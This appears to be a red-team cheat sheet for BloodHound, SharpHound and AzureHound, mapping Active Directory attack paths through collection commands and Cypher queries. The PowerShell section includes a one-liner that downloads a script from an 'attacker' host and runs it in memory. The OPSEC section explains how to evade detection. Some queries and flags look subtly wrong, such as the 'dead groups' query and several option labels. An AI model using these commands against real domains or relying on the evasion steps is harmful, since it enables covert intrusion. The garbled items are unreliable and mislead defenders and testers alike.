# <span style="color:rgb(255, 192, 0)">BloodHound & SharpHound - Complete Command Reference</span>

BloodHound uses graph theory to identify complex attack paths in Active Directory. SharpHound is the data collector. BloodHound CE is the modern web-based version.

---

## <span style="color:rgb(255, 0, 0)">Installation</span>

### Neo4j Database

```bash
# Docker (recommended)
docker run -d --name neo4j -p 7474:7474 -p 7687:7687 \
  -e NEO4J_AUTH=neo4j/BloodHound \
  -e NEO4J_PLUGINS='["apoc"]' \
  neo4j:5

# Linux native
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable 4.1' | sudo tee /etc/apt/sources.list.d/neo4j.list
sudo apt update && sudo apt install neo4j -y
sudo systemctl enable neo4j && sudo systemctl start neo4j

# Set password
sudo neo4j-admin set-initial-password BloodHound
# Or via browser at http://localhost:7474 (default neo4j:neo4j)
```

### BloodHound CE (Community Edition)

```bash
# Docker Compose
cat > docker-compose.yml << 'EOF'
version: '3.8'
services:
  bloodhound:
    image: ghcr.io/specterops/bloodhound-ce:latest
    ports:
      - "8080:8080"
    environment:
      - BLOODHOUND_ACCEPT_EULA=Y
    volumes:
      - bloodhound-data:/var/lib/bloodhound
volumes:
  bloodhound-data:
EOF

docker-compose up -d
# Navigate to http://localhost:8080
```

### BloodHound Legacy (v4.x)

```bash
wget https://github.com/SpecterOps/BloodHound/releases/download/v4.2.0/BloodHound-linux-x64.zip
unzip BloodHound-linux-x64.zip
./BloodHound --no-sandbox
```

### BloodHound.py (Python Collector)

```bash
git clone https://github.com/dirkjanm/BloodHound.py.git
cd BloodHound.py && pip install .
```

---

## <span style="color:rgb(0, 176, 240)">SharpHound Collection Methods</span>

### SharpHound.exe (Binary)

```powershell
# All collection methods
SharpHound.exe -c All

# Specific prefix for output files
SharpHound.exe -c All --OutputPrefix "audit1"

# Zip output filename
SharpHound.exe -c All --OutputDirectory C:\temp\ --ZipFileName output.zip

# Specify domain
SharpHound.exe -c All -d domain.local

# Specific collection methods
SharpHound.exe -c Group,Session,Trusts,ACL,ObjectProps,Container,ComputerOnly

# DC-Only (minimal network impact)
SharpHound.exe -c DCOnly

# LDAP filter for specific computers
SharpHound.exe --SearchBase "OU=Servers,DC=domain,DC=local"

# With caching (skip previously collected)
SharpHound.exe -c All --CacheName cache.bin

# Loop collection with interval
SharpHound.exe -c All --Loop --LoopInterval 00:05:00

# Stealth collection
SharpHound.exe -c Group,LocalGroup,Session --Stealth

# Exclude DCs
SharpHound.exe -c All --ExcludeDCs

# Collect with domain controller
SharpHound.exe -c All -d domain.local --DomainController dc01.domain.local

# Collect from LDAP port
SharpHound.exe -c All --LdapPort 389

# Real-time (continuous collection)
SharpHound.exe --RealTime --CollectionInterval 30

# Disable Kerberos signing
SharpHound.exe -c All --DisableKerberosSigning

# Skip port scanning
SharpHound.exe -c All --SkipPortScan

# Override SMB/Ports
SharpHound.exe -c All --OverrideUserName user --OverridePassword pass
```

### Collection Methods Explained

| Method | Description | Requires Admin | Network Traffic |
|--------|-------------|----------------|-----------------|
| `Group` | Enumerate groups, memberships, nested groups | No | Low |
| `Session` | User sessions on computers | Yes* | Medium |
| `SessionLoop` | Continuous session collection | Yes* | Medium |
| `ACL` | ACL/ACE information (attack paths) | No | High |
| `ObjectProps` | Object properties (description, lastlogon) | No | Medium |
| `ComputerOnly` | Computer objects only | No | Medium |
| `Trusts` | Domain/forest trusts | No | Low |
| `Default` | Group, Session, ACL, ObjectProps, ComputerOnly, Trusts | No* | High |
| `DCOnly` | Collect from DC only (via LDAP) | No | Low |
| `All` | Everything | Partially | Maximum |
| `RDP` | RDP sessions on computers | Yes | Medium |
| `DCOM` | DCOM sessions | Yes | Medium |
| `PSRemote` | PowerShell remoting sessions | Yes | Medium |
| `LocalGroup` | Local admin groups (requires admin) | Yes | Medium |
| `GPOLocalGroup` | GPO local group memberships | No | Low |
| `LoggedOn` | Who's logged on (requires admin) | Yes | Medium |
| `Container` | Container/OU structure | No | Low |
| `ExactCollection` | Collect with no optimization | No | Very High |

*\*Session collection requires admin rights on target*

### Collection with Authentication

```powershell
# Using cached credentials (logged-in user)
SharpHound.exe -c All

# Explicit credentials
SharpHound.exe -c All --Domain domain.local --LdapUsername user@domain.local --LdapPassword pass

# Using password file
SharpHound.exe -c All --LdapUsername user@domain.local --LdapPasswordFile pass.txt

# Using current Windows identity
SharpHound.exe -c All --SecureLdap
```

### SharpHound.ps1 (PowerShell)

```powershell
# Load in memory
iex (New-Object Net.WebClient).DownloadString('http://attacker/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All

# With parameters
Invoke-BloodHound -CollectionMethod All -Domain domain.local -OutputDirectory C:\temp\

# Stealth
Invoke-BloodHound -CollectionMethod Group,Session,ACL

# Cache for large environments
Invoke-BloodHound -CacheName cache.bin

# Loop
Invoke-BloodHound -CollectionMethod All -Loop -LoopInterval 00:10:00
```

---

## <span style="color:rgb(146, 208, 80)">BloodHound.py (Python)</span>

```bash
# Basic collection
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local -c All

# Specific collection methods
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local \
  -c Group,Session,Trusts,ACL

# DNS-based domain discovery
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local \
  -c All --dns-tcp

# Disable auto-GC resolution
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local \
  --disable-autogc

# Exclude domain trusts
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local \
  --no-trusts

# Specify name server
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local \
  --nameserver 10.0.0.1

# Output directory
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local \
  --outputdirectory /tmp/bloodhound/

# Collect from IP range
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local \
  --collectionmethod LoggedOn --computer-ip-range 192.168.1.0/24

# Throttle requests
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local \
  --throttle 5000

# Zip output
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local \
  --zip

# Using NTLM hash
bloodhound-python -u user -H :NTLM -d domain.local -dc dc01.domain.local -c All

# Using Kerberos
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local \
  -c All -k

# Using LDAPS (port 636)
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local \
  --ldaps

# Use SSL
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local \
  --use-ldaps
```

---

## <span style="color:rgb(255, 0, 0)">Custom Cypher Queries</span>

### Pre-built Queries (BloodHound UI)

BloodHound CE has a "Cypher" tab with these query categories:
- **Find all Domain Admins** - Find all users with DA rights
- **Find all sessions of privileged users** - Users with admin sessions
- **Shortest paths to Domain Admins** - Attack path analysis
- **Shortest paths from owned principals** - From compromised users
- **Find computers with unconstrained delegation** - Delegation targets
- **Find computers where Domain Admins have sessions** - Session targets
- **Kerberoastable users** - Users with SPNs
- **AS-REP roastable users** - Users without pre-auth
- **Users with most admin rights** - High value targets
- **Highly privileged groups** - Groups with special ACEs

### Useful Custom Cypher Queries

```cypher
// Find all Kerberoastable accounts
MATCH (u:User {hasspn:true}) RETURN u

// Find all AS-REP roastable accounts
MATCH (u:User {dontreqpreauth:true}) RETURN u

// Find all domain admins with their sessions
MATCH (u:User)-[:MemberOf]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})
MATCH (u)-[:HasSession]->(c:Computer)
RETURN u.name, c.name

// Find shortest path from a specific user to Domain Admins
MATCH (u:User {name:'USER@DOMAIN.LOCAL'}), (g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})
MATCH p = shortestPath((u)-[:MemberOf|HasSession|AdminTo|ACL*1..]->(g))
RETURN p

// Find all users with GenericAll over other users
MATCH (u:User)-[:GenericAll]->(target:User)
RETURN u.name, target.name

// Find users with DCSync rights (Replication-Get-Changes-All)
MATCH (u:User)-[:ReplicationGetChangesAll]->(d:Domain)
RETURN u.name

// Find computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

// Find computers with constrained delegation
MATCH (c:Computer)-[:AllowedToDelegate]->(t:Computer)
RETURN c.name, t.name

// Find all GPOs applied to computers
MATCH (g:GPO)-[:GpLink]->(c:Computer) RETURN g.name, c.name

// Find users who can RDP to computers
MATCH (u:User)-[:CanRDP]->(c:Computer) RETURN u.name, c.name

// Find users with local admin rights via groups
MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name

// Find users with SQL admin rights
MATCH (u:User)-[:SQLAdmin]->(c:Computer) RETURN u.name, c.name

// Find users who can write to GPO
MATCH (u:User)-[:WriteGPO]->(g:GPO) RETURN u.name, g.name

// Find ACL links between users that allow privilege escalation
MATCH p = (u:User)-[:ACL*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})
RETURN p

// Find all paths from domain users to high value targets
MATCH (u:User), (target)
WHERE target.highvalue = true
MATCH p = shortestPath((u)-[*1..]->(target))
RETURN p

// Find users that are not in the Protected Users group
MATCH (u:User)
WHERE NOT (u)-[:MemberOf]->(:Group {name:'PROTECTED USERS@DOMAIN.LOCAL'})
RETURN u

// Find computers with LAPS
MATCH (c:Computer) WHERE c.haslaps = true RETURN c

// Count sessions per user
MATCH (u:User)-[:HasSession]->(c:Computer)
RETURN u.name, count(c) as sessions
ORDER BY sessions DESC

// Find all foreign group memberships (cross-trust)
MATCH (u:User)-[:MemberOf]->(g:Group)
WHERE NOT g.domain = u.domain
RETURN u, g

// Find domains with trust relationships
MATCH (d:Domain)-[:TrustedBy]->(t:Domain)
RETURN d.name, t.name

// Find high-value users (admincount = true)
MATCH (u:User {admincount:true}) RETURN u.name

// Most privileged users (by number of admin rights)
MATCH (u:User)-[:AdminTo]->(c:Computer)
RETURN u.name, count(c) AS adminCount
ORDER BY adminCount DESC

// Find computers with inbound object control
MATCH p = (u)-[:GenericAll|GenericWrite|WriteOwner|WriteDacl]->(c:Computer)
WHERE c:Computer
RETURN p

// Find groups that have no members (dead groups)
MATCH (g:Group)
WHERE NOT (g)-[:MemberOf]->()
OPTIONAL MATCH (m)-[:MemberOf*1..]->(g)
WITH g, count(m) AS members
WHERE members = 0
RETURN g.name

// Find all service principals
MATCH (u:User) WHERE u.hasspn = true
RETURN u.name, u.serviceprincipalnames

// Find users who are enterprise admins
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:'ENTERPRISE ADMINS@DOMAIN.LOCAL'})
RETURN u.name

// Check for SID history on users
MATCH (u:User) WHERE u.sidhistory IS NOT NULL
RETURN u.name, u.sidhistory

// Find computers not in the domain admins session path (safe)
MATCH (c:Computer)
WHERE NOT EXISTS ((:User)-[:MemberOf*1..]->(:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})-[:HasSession]->(c))
RETURN c.name
```

### Useful Neo4j Commands

```cypher
// List all node labels
CALL db.labels()

// Count nodes by label
MATCH (n) RETURN labels(n), count(n) ORDER BY count(n) DESC

// Count relationships
CALL db.relationshipTypes()

// Get database stats
CALL dbms.listConfig()

// Delete all nodes (start fresh)
MATCH (n) DETACH DELETE n

// Find all marked as "owned"
MATCH (n) WHERE n.owned = true RETURN n

// Mark a user as owned
MATCH (u:User {name:'USER@DOMAIN.LOCAL'}) SET u.owned = true

// Export subgraph
CALL apoc.export.graphml.query("MATCH (n)-[r]->(m) RETURN n,r,m", "output.graphml", {})
```

---

## <span style="color:rgb(0, 176, 240)">BloodHound CE Usage</span>

### Data Ingestion

```bash
# Via Web UI
# 1. Navigate to http://localhost:8080
# 2. Log in with initial admin credentials (set during setup)
# 3. Go to "Upload" or "Import Data" tab
# 4. Drag & drop the SharpHound .zip file

# Via BloodHound CLI
# BloodHound CE supports API ingestion
curl -X POST -F "file=@/path/to/data.zip" \
  http://localhost:8080/api/v1/upload \
  -H "Authorization: Bearer <TOKEN>"
```

### Key UI Features

| Feature | Location | Description |
|---------|----------|-------------|
| Node Search | Search bar | Find users, groups, computers, OUs, GPOs |
| Path Finding | Analysis tab | Find shortest paths between nodes |
| Outbound Control | Node Info | What a node can control |
| Inbound Control | Node Info | Who can control a node |
| Sessions | Node Info | Active sessions on computers |
| High-Value Targets | Label icon | Marked as high-value objects |
| Cypher Queries | Query tab | Custom Neo4j queries |
| Pre-built Queries | Queries dropdown | Common analysis queries |
| Node Labeling | Right-click | Mark as "owned" |
| Graph Export | Export button | Export as PNG, JSON, GraphML |

### BloodHound Markdown Types

| Node Type | Hex Shape | Description |
|-----------|-----------|-------------|
| User | Circle | Domain user account |
| Group | Diamond | Security group |
| Computer | Rectangle | Domain-joined computer/Server |
| Domain | Double Octagon | AD Domain |
| OU | Pentagon | Organizational Unit |
| GPO | Hexagon | Group Policy Object |
| Trust | Dashed line | Trust relationship |

### Edge Types (Relationships)

| Relationship | Description |
|-------------|-------------|
| `MemberOf` | User/Group is member of group |
| `HasSession` | User has session on computer |
| `AdminTo` | User has local admin on computer |
| `CanRDP` | User can RDP to computer |
| `CanPSRemote` | User can PowerShell remote |
| `ExecuteDCOM` | User can execute DCOM |
| `AllowedToDelegate` | Computer can delegate to target |
| `Contains` | Container (OU/Domain) contains object |
| `GpLink` | GPO applied to container |
| `TrustedBy` | Domain trusted by another domain |
| `GenericAll` | Full control over object |
| `GenericWrite` | Write privileges over object |
| `WriteOwner` | Can change owner |
| `WriteDacl` | Can modify DACL |
| `ForceChangePassword` | Can force password reset |
| `AddMember` | Can add members to group |
| `AddKeyCredentialLink` | Can add key credential (Shadow Credentials) |
| `ReadLAPSPassword` | Can read LAPS password |
| `ReadGMSAPassword` | Can read gMSA password |
| `GetChanges/All` | DCSync privileges |
| `Owns` | User owns object |
| `DumpSMSAPassword` | Can dump SMA password |
| `SQLAdmin` | SQL admin on server |

---

## <span style="color:rgb(146, 208, 80)">AzureHound</span>

```powershell
# AzureHound (Azure AD collector)
# Download from GitHub releases

# Collect Azure information
AzureHound.exe -o AzureHoundOutput

# With credentials
AzureHound.exe -u user@domain.onmicrosoft.com -p pass -o output

# For hybrid environments (collect both)
SharpHound.exe -c All
AzureHound.exe -o AzureOutput
```

---

## <span style="color:rgb(255, 0, 0)">OPSEC Considerations</span>

```yaml
Network Traffic:
  - SharpHound generates LDAP queries (port 389/636)
  - Session collection = SMB RPC connections to each target
  - BloodHound.py uses LDAP only (DCOnly by default)
  - Session collection triggers Event ID 4624 (logon) on targets
    
Detection:
  - Event ID 4662: An operation was performed on an object (ACL reads)
  - Event ID 4688: Process creation (SharpHound.exe)
  - LDAP query patterns (userAccountControl scanning)
  - Network scanning (SMB enumeration)
    
Stealth Options:
  - Use DCOnly collection (no network scanning)
  - Use BloodHound.py (LDAP only)
  - Use --Stealth flag (SharpHound)
  - Avoid Session collection (most noisy)
  - Collect during off-peak hours
  - Use --SkipPortScan
```
